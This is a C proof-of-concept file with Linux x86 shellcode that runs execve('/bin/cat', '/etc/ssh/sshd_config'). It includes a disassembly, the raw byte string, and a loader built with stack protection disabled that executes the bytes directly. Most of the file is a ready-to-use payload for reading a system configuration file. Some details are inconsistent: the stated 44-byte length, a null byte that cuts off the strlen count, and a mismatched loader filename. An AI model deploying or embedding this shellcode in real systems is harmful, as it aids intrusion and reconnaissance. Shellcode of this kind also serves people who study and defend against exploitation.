/*
# Linux/x86 - execve(/bin/cat /etc/ssh/sshd_config) Shellcode 44 Bytes
# Author: Goutham Madhwaraj
# Date: 2018-10-22
# Tested on: i686 GNU/Linux
# Shellcode Length: 44
# ShoutOut - BarrierSec
# gcc -fno-stack-protector -z execstack loader-bind.c -o

Disassembly of section .text:

08048080 <_start>:
 8048080:	31 c0                	xor    eax,eax
 8048082:	50                   	push   eax
 8048083:	68 2f 63 61 74       	push   0x7461632f
 8048088:	68 2f 62 69 6e       	push   0x6e69622f
 804808d:	89 e3                	mov    ebx,esp
 804808f:	50                   	push   eax
 8048090:	68 6e 66 69 67       	push   0x6769666e
 8048095:	68 64 5f 63 6f       	push   0x6f635f64
 804809a:	68 2f 73 73 68       	push   0x6873732f
 804809f:	68 2f 73 73 68       	push   0x6873732f
 80480a4:	68 2f 65 74 63       	push   0x6374652f
 80480a9:	89 e1                	mov    ecx,esp
 80480ab:	6a 00                	push   0x0
 80480ad:	51                   	push   ecx
 80480ae:	53                   	push   ebx
 80480af:	89 e1                	mov    ecx,esp
 80480b1:	50                   	push   eax
 80480b2:	89 e2                	mov    edx,esp
 80480b4:	b0 0b                	mov    al,0xb
 80480b6:	cd 80                	int    0x80

===============POC by Goutham Madhwaraj=========================
*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x6e\x66\x69\x67\x68\x64\x5f\x63\x6f\x68\x2f\x73\x73\x68\x68\x2f\x73\x73\x68\x68\x2f\x65\x74\x63\x89\xe1\x6a\x00\x51\x53\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}